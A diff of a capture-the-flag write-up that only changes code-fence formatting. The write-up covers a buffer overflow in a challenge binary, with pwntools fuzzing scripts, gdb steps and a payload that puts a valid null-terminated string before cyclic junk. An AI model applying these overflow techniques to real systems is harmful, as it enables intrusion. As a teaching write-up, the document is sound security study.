@@ -4,7 +4,7 @@ We got a Dockerfile, a libc, a linker, a binary and the source code,
 which is why my first thought was a ret2libc attack but it turned out that was not necessary.
 
 ### Source Code:  
-'''
+```
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -38,19 +38,19 @@ int main(void) {
     exit(1);
   }
 }
-'''
+```
 
 Looking at how the binary gets it's apparently vulnerable to a buffer overflow.
 First I built a little script to generate test payloads:  
-'''
+```
 from pwn import *
 import sys
 
 junk = cyclic(200)
 
 sys.stdout.buffer.write(junk)
-'''
-'''
+```
+```
 python fuzzer.py > test
 --
 gdb bot
@@ -59,13 +59,13 @@ b main
 --
 r < test
 
-'''
+```
 
 But when I executed the binary with gdb, it did not cause the binary to crash since it exits  
 when an input does not equal any of the strings in the source code.
 
 My second try looked like:
-'''
+```
 from pwn import *
 import sys
 
@@ -73,5 +73,5 @@ junk = cyclic(200)
 prefix = b"give me the flag\0"
 
 sys.stdout.buffer.write(prefix + junk)
-'''
+```
 In order to get the binary to not exit but still overflow the buffer, I added a "valid" input, ending in a nullbyte.
